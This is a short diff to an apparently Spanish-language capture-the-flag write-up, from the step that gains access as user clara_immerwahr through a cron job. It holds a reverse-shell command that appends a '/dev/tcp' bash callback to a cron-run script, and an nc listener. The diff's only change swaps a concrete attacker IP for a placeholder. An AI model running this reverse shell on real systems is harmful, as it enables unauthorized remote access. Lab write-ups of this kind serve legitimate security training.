@@ -311,7 +311,7 @@ Obtención de acceso al usuario clara_immerwahr explotando la tarea cron que eje
 
 ```bash
 nc -lvnp 9001 en kali
-haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/192.168.1.104/9001 0>&1" >> /opt/scripts/backup_notes.sh
+haber_fritz@ammonia:~$ echo "bash -i >& /dev/tcp/IP atacante/9001 0>&1" >> /opt/scripts/backup_notes.sh
 
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9001
